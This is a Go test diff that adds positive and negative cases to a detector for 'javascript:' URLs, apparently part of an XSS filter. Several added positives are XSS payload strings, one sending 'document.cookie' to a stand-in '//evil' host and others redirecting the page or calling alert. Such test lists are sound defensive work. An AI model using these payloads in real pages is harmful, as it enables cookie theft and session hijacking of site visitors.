@@ -111,6 +111,15 @@ var (
 		// a call after ')' and a global assigned a global
 		"javascript: x=(alert)(1)",
 		"javascript: top=self",
+		// A dummy assignment before the real statement (re-review N1).
+		"javascript: a=1; location='//evil/?'+document.cookie",
+		"javascript: a=1; location=name",
+		"javascript: x=1; document.location='//evil'",
+		"javascript: a=1; top.location=name",
+		"javascript: a=1; alert (1)",
+		"javascript: a=1;location=name",
+		"javascript: a=1, location=name",
+		"javascript: a=1;  window.location.href='//evil'",
 	}
 	scriptURLNegatives = []string{
 		"JavaScript: The Good Parts",
@@ -128,6 +137,13 @@ var (
 		"javascript: &#9; is a tab",
 		"javascript:&amp;",
 		"javascript: version=&#9;ES6",
+		// later clauses that are plain words
+		"javascript: a=1; b=2, c=3",
+		"JavaScript: level=beginner, duration (2 weeks)",
+		"JavaScript: yes=no; maybe later",
+		"javascript: tip=1; e.g. practise daily",
+		"javascript: a=1; name=Ali",
+		"javascript: a=1; x==2",
 	}
 )
 
